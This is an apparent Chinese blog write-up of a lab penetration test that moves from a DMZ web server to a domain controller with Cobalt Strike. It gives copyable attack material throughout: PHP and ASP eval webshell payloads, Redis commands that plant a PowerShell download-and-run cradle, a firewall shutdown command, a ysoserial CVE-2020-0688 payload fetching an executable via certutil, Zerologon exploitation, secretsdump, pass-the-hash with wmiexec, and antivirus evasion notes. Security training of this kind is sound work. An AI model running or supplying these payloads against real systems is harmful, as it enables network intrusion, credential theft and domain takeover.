> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/TFvtPoy2-7hcTbKbHVXrWg)

**基于 Cobalt Strike 的从外网打点到拿下域控**

![](https://mmbiz.qpic.cn/mmbiz_gif/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEaibecChbGEVypvJ8f7y3WPAsWNvN208dyLVNb1PnAUv1T1QmyW4Cibibw/640?wx_fmt=gif)

**忙完考试和论文的事情了，感谢月师傅给的测试学习机会**

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEkkzOPl5hW4ibCqRqaszYfRzeNQLOUctw6CkpBd4gf7yOD6hNwOaaCsg/640?wx_fmt=png)

**注：本文所示均基于虚拟环境**

**DMZ WEB Server**

边界的 web 服务器就像上图，是一个网络用户管理系统，探测了下目录找到一个 web.zip 是源码，接下来就是源码审计。

**Mysql Rest Getshell**

kss_tool\reset.php

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEWHaPMaVkQrkvZBGI57xYSB5ckFuISxQQQeF35HaUF9cX86ks8roCYQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEia1Gtiatekziaibb3Mv29Q9J9df24lurWemWBZjCgf2LEytFXicugKypKCQ/640?wx_fmt=png)

可以重置数据库，但是做了一个验证安全接口密码的操作，经过审计分析，安全接口明文存放在源码当中:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEnib3iagiaq9xZVw0w26tXDMQd32LfLTiaUuoibdegkIoS4mC3QG0R6FZ1WA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEZ4fknZdmgGsVicT0e9WIiaT0uTXOibGNdGb5ic1Do7yaKqOpwl9NUVDGhA/640?wx_fmt=png)

直接 vps 整个库连上，即修改了管理员密码，本来想看更新 config.php 能不能直接写 shell，好像不太行，怕搞坏就没整了。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEqetQIfNjOnHgL27euicRdYkDRdwSsjqLBpCOUazLfjfibLQKibJJXAPMw/640?wx_fmt=png)

后面发现后台没有可利用的东西，还是回去审一下能不能直接 getshell。还是刚才的 reset.php:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEEWODP6mibr3PrnsuxKkxevqiafdoVGQMVsxaaMfDynym4vvARl3RhnyQ/640?wx_fmt=png)

可以看到 $nsvrid 是可控的，并且写入了_config.php，mco2() 就是起了个拼接作用。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEL916tzc8UuuiaiafgbH8ibegic8mLgGyHI933GHshAYLMmEqPvt7O3YXRw/640?wx_fmt=png)

因此我们可以尝试 getshell，payload 如下:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEFSkZEPgKLU5EnAxCIIqShVibXrcE32iaTXmbtI3OTicspIIZZMybtv2lQ/640?wx_fmt=png)

或者写完整的 shell，把后面多出来的括号分号注释掉也可以。

------WebKitFormBoundaryQgYqBaldcHDIOdbZContent-Dis;  1);@eval($_POST[R2S]);//

效果如下:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEaPxB8IIA8ct2Yicd9ZC05LJPrVPSGAQ8olc1tD0icIMEM7bh4JCrAzBg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEjcyPaA7V1DWmU8tsMHAFWR2GEWRfSLoaPrKl95UcqlRO9hTPOs8iaOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEe2u6ibCTzSb2aSN68Coq0Zvd3djoUWPSfPtE5MZKsZEgNH9mY8ZqgLA/640?wx_fmt=png)

**BT Bypass Disable_Functions**

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEBuX7atvcXdjmIIuHD1NsYb9ibBD9KqFiarXQN4o2ONI1NzHgPecMBmmQ/640?wx_fmt=png)

windows 下的，试了下没什么办法绕过 disablefunctions，同时也不支持解析其他脚本语言。

其实权限还是挺大的，就是不能执行命令，有 BT 和火绒。从宝塔入手:

C:/BtSoft/panel/data/

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEZTibxdcT990oU69XEeLEndhWLA0qRticv3pLvvXlafdysLQiazfeX1DNw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEE2HKHQ8ibfLCictCxiczNpotlwX4EI4nURib144n8bd14SEia4YnOkR0ddpQ/640?wx_fmt=png)

defaule.db

后台入口以及账号密码, 带盐也没解开，翻文件:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEErKsvFsHuo33o5zbaw5OkoYjeMus0SCf3AicRp5VwcGHYqX0clv8etbg/640?wx_fmt=png)

默认密码用第一个用户名登陆成功。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEE5GhClxnfu5BrDrEWymmbM7l87kKcH0aiajAyyTWPwLPiaHZX9ldaspDQ/640?wx_fmt=png)

可以执行命令。

**CS Bypass Huorong**

因为翻目录看到有火绒，tasklist 一下:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEibM2zlDgX0mWBMS4Wha5wlKqk6Jkm2eIjWUZx2j5sJsPD8F91LnvS6Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEE6njSNvrrhkApaLUNWpYsqDJWrRZf6rALtM7biaibxGr6scTn5mD5j7FA/640?wx_fmt=png)

因为权限不小，尝试能不能 kill 掉:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEnV46LQjrjvNzxthMUGRwMl61fIJEngYl08CKAzOIqzjiaTRAyicnO9TA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEE8RvvGibNXjLUp7n19x0GOA87oyQwDygCbhhPiboI5880ibD0DBnXicMvkg/640?wx_fmt=png)

果然还是 k 不掉，估计只能老老实实免杀:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEesptMV4T7sUEntbjLoyYxRhh71b6J51LLNaJ8SMlsLiaBf9FkIEpDVg/640?wx_fmt=png)

尝试了一些免杀操作，奈何确实是太菜了没有成功，我本地运行 powershellpayload 的时候发现火绒拦截的是隐藏操作，因此去掉 payload 中的 -whidden 参数，本地测试上线成功。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEnkyy4D8HsvyOBtHtDiad4DCiaSEEiaqX82mbswgTRB1sdLDGw0yqP3iaEQ/640?wx_fmt=png)

远程上线成功，顺便抓了个 hash。

**Redis Server**

上线 cs 首先是做了个 socks4 代理，然后 netview 探测一下内，没收到结果，最后还是 nmap:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEQJpf0Ze4p8VOunc5vH2KhCRdolJ4Kh1E7c4jcI7XQogkJGsYO6laoA/640?wx_fmt=png)

192.168.59.4 是存活的，我们着重看一下, 发现开了 80 和 6379。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEErlO460ic8iaOzcmQXnicaibc9oLwH4CicpK8EnZLnsjC3S1fDB8yyXCdUEw/640?wx_fmt=png)

确定是一台 Windowsserver。

**Getshell**

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEE7bYGK9o6ln1NenjoUIhEUEIt9R1iaJRSeiacIQtoaciatnt1icVPpRYh6A/640?wx_fmt=png)

并不存在未授权访问的情况，尝试 msf 爆破:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEE7icw4sdvbKC3fJYOaaoLSYMWYSjssySvDkCSZIOmlVIMRhAWcVmUicgQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEe2Gc2tiaB11z4KteAeW56dClQa5NdKd7YAPwYqJyYKf6QN1RD1I9dyw/640?wx_fmt=png)

尝试 CS 上线：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEicyJ3LdS7Stiaq7HOJ9I0WvnZFVLHvKCMhj8MPnXXTViczarHQwxstkbg/640?wx_fmt=png)

192.168.59.4:6379> config set dir"C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/StartMenu/Programs/startup/" OK 192.168.59.4:6379> config setdbfilename shell.bat OK 192.168.59.4:6379> set x"\r\n\r\npowershell.exe -nop -w hidden -c \"IEX((new-objectnet.webclient).downloadstring('http://192.168.59.133:8234/a'))\"\r\n\r\n"OK 192.168.59.4:6379> save OK

没有办法，弹不到 shell，尝试看看 iis 这边能有什么突破:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEE0rGBJG1AWKibN8L22MA7lj8f6hE5GWRLmHNoiak7dzp9IcYXUtOTiaGaw/640?wx_fmt=png)

尝试了 n 久，终于…(忘了 iis 应该可以爆路径)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEE1Eu6tAwkHpD3nyfSynPn9cITibHicazCgGxGZRNCk3z0cLj81KAiaibVkQ/640?wx_fmt=png)

虽然 500，但是明显是可以解析的，好好写一个一句话就可以了。

192.168.59.4:6379> config set dirC:\inetpub\wwwroot OK 192.168.59.4:6379> config set dbfilenamea.asp OK 192.168.59.4:6379> set x "\r\n\r\n<%evalrequest(\"ra\")%>\r\n\r\n" OK 192.168.59.4:6379>save OK

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEEiaVZJ7A4Lv0P8Iy12etBbKNiarPXibHGGBerao0CZ11hjqLn9la0IUVw/640?wx_fmt=png)

应该是不出网，权限非常小，找到 ALLUSER 目录可以写。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEnx0eWRG5ichtvzpOz6FKEZahvVtckewwmyP6XyZJ0ltJGYicIyt2GAsg/640?wx_fmt=png)

上传东西的时候设置分片小一点，最大超时时间大一点。在弹 shell 的时候发现没有上线，ping 了一下 DMZ 没通，估计是防火墙，所以关了 DMZ 的防火墙。

NetSh Advfirewall set allprofiles state off

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEPTXM85ibt7FxggoU1ZpWLhWLwTb2PxQaYrEzJImOHWmj8Y3lbb1034g/640?wx_fmt=png)

上线成功。

**Privilege Escalation**

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEJjZY4fxHWofqDGE2bCVgrhcibRSQIWrAOXgdMwUKSrMicIQ013hqz7HA/640?wx_fmt=png)

直接成了 --，再上线。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEECPuVpbzs2cBmgI08sf9zNiag5DOjcAU6jnCcTVLrdqdQdTIgzruYtuw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEXK6v6TzsIyP16vecz9DQ63HjTP3ANt5Pw7mew6jib3lWjuiaYe7Dk0Tw/640?wx_fmt=png)

**Exchange Server**

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEIm8EgGEW3cHtXwcjicgUeibNg80k10yZjWLoV6yghSA0rL4Ly4uelY0g/640?wx_fmt=png)

两张网卡，我们先来探测一下。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEp13UxIAlIFiayONfhqO6qKhoPBF6UAl4vicdfsqRtgTlolfrjBQZhdPQ/640?wx_fmt=png)

需要注意，cs 在第二层网络做 sockets 的时候，就不需要在本地挂双层代理了，挂这二层网络的一个 socks 就可以。

着重看 201 和 209. 端口探测结果如下:

201: 49115 139 80 445 135   209: 6006 593 99525 110 587 135 139 80 443 445

着重关注一下 445 这个端口，试了一下永恒之蓝并没有成功。

看了下两台机器的 80 端口，都是 IIS 的 forbidden，但是 209 的 443 是一个 outlook。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEUrfdIiclibNof2PvcTcXTUmQGaFMFesvB84kB2htwfgOFUUms0o7iagKA/640?wx_fmt=png)

考虑的是 CVE-2020-0688 和 CVE-2021-26857 这两个。在这之前又在 redis 服务器上翻了翻文件。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEENovgHojEW1avGTvRaMErpUpiciaNxrib9rsKEp3p6AEZrjNf5mB5AVgVg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEE7E0GPWLEKn1yx4uHZYXib45OM3uicvg9EicW4230ibYUyPekJa23HOYyNw/640?wx_fmt=png)

试了每个密码都不对，后面看了下 pst:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEKia7oIhVyiaP6ntStlxpoibC87SdvUibEvf9rA2XpCiafXHpKhmZuGKvh0A/640?wx_fmt=png)

**CVE-2020-0688**

登陆成功，我们来手工复现 CVE-2020-0688

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEETAFDXPMjE7ZK9e3h6iagfkfTUw6GricHsDu1FymzzuoR6cA3HL8HRvXA/640?wx_fmt=png)

viewstateuserkey

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEpiaYd85vicmiaHoDLtUHBxay1kvftiayrfqtBdlibEY6rdQWpeDjbYvteIg/640?wx_fmt=png)

generator

--validationkey =CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF 默认，漏洞产生原因 --validationalg =SHA1 默认，漏洞产生原因 --generator =B97B4E27 基本默认 --viewstateuserkey= 89b39456-36b1-44ce-bb28-ea9d5ff2da5f

构造如下 payload 使用 ysoserial 进行反序列化，尝试写了 shell，但是 windows 写 shell 真的烦，不成功，所以把 shell 放到 redis 服务器上然后调用 powershell 下载，成功但是总是 500，直接上 cs 的马 (redis 有两个 ip，CSListener 用 192.168.59 段的不会上线，10 段的就可以):

```
ysoserial.exe -p ViewState -gTextFormattingRunProperties -c "cmd.exe /c certutil -urlcache-split -f http://10.10.10.202/be.exe b.exe && b.exe"--validationalg="SHA1"--validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF"--generator="B97B4E27"--viewstateuserkey="89b39456-36b1-44ce-bb28-ea9d5ff2da5f"--isdebug --islegacy
```

然后将 payload 进行 URL 编码访问, 记得替换 <generator> 以及 <ViewState> :

/ecp/default.aspx?__VIEWSTATEGENERATOR=<generator>&__VIEWSTATE=<ViewState>

访问后会 500，等上线就可以了。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEIrKlMLLgqrFkWJHdpmqARNvS6XzxRyKjLgZPSY7AnIibTjX2jfED5ibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEvZdWbZbOV2mBMUPflGQWgStexFINIibRb6oGn5CHmHpv0rrLjKxPutQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEESdDlcAulM906t1BK0vso8DcS2F1ibunfQRb8oj0rWvrnkgE4H5Yn6tA/640?wx_fmt=png)

**DC Server**

域控我们之前探测的是 201，最先想到的是 CVE-2020-1472

**CVE-2020-1472**

1、置空:

```
proxychains cve-2020-1472-exploit.py12server-dc$(dc name) 10.10.10.201(dc ip)  proxychainscve-2020-1472-exploit.py 12server-dc$ 10.10.10.201
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEveFOVRwFQqbIp8twyZ3uZ2icdfghhwu8pyv4OfKp7To2vMuvgT6R9iaA/640?wx_fmt=png)

2、导 hash—(脚本报错没有 impacket.example.utils 以及 keyta 库解决方案):

将 impacket-master/impacket/example/utils 以及 impacket-master/impacket/example/krb5 拷贝到脚本目录，并修改引用库如下:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEfOv0xwiblXB06bMpcGDoiaaq86uIfl4f6M3A9x60qFRavFGlP2RIeUEw/640?wx_fmt=png)

```
proxychains python3 secretsdump.pycncat/12SERVER-DC\$@10.10.10.201(dc/dc name@dc ip，$要转义) -no-pass   proxychains python3 secretsdump.pyXXX/12SERVER-DC\$@10.10.10.201 -no-pass
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEK31U4A9HiaFnIPK5ib6aDdY3ucpHBlvfKWYXdTolX1icafpzjD2yyytwQ/640?wx_fmt=png)

3、拿 shell

```
python3 wmiexec.py -hashesaad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387(administrator'shashes) XXX/administrator@10.10.10.201(domain/administrator@domainip)  python3 wmiexec.py -hashesaad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387cncat.cc/administrator@10.10.10.201
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEExJ7xicHxyFd1czM2onrDkhUrICIPbt3kOIYu3LQsMXFqa8QvwSPLX4g/640?wx_fmt=png)

同样下载 redis 上面的马来上线 CS:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEETqV1lz4gIuqUfOxxqZtwT5aFEa0qIGAuYVkbVuKFweBa3hegZgfwmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEQczHvNMcajKSd4p61NPDebRKXXMPSicAoczzHml4fzRWicoYzqwvlzicA/640?wx_fmt=png)

**Summary**

总结一下:

1.  通过 DMZ WEB SERVER 代码泄露审计写马，翻出 BT 后台、账号密码以及通过 BT 上线 CS
    
2.  第二层的 REDIS SERVER 是爆破密码进入，可以通过 IIS 泄露物理路径或猜测 IIS 默认路径写 webshell 然后上线 CS 通过 CS 自带的 getsystem 提权
    
3.  EXCHANGE 服务器是通过 REDIS SERVER 翻出用户密码，通过 CVE-2020-0688 RCE
    
4.  DC SERVER 是 CVE-2020-1472 NETLOGON
    

一些小细节:

1.  第一层 CS 上线以后就可以用 CS 自带的 SOCKS 做代理，通过 NMAP 探测的内网，第二层做代理时不需要和第一层一起构造成链，单独代理第二层即可。
    
2.  EX RCE 写 shell 不成功可以通过 RCE 下载并执行 CS 后门 EXE 上线。
    
3.  NETLOGON 利用时脚本 import 有问题，但是发现其实是有文件的，就可以把文件复制到当前目录直接 import filename
    
4.  还有信息收集很重要，找不到 exchange 的用户洞是用不了的。
    
5.  最后就是配置 CS 的时候，服务器 IP 客户端登不上，要域名才登陆成功，Listener 也是。
    

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABK0yH8Sx7J8ibkiclKeqwgEEvtRJEL0PDG81AxhjGFPQAtFJ0IhmCvgeiaLEkHXHz91hWVUDbNyiarjA/640?wx_fmt=png)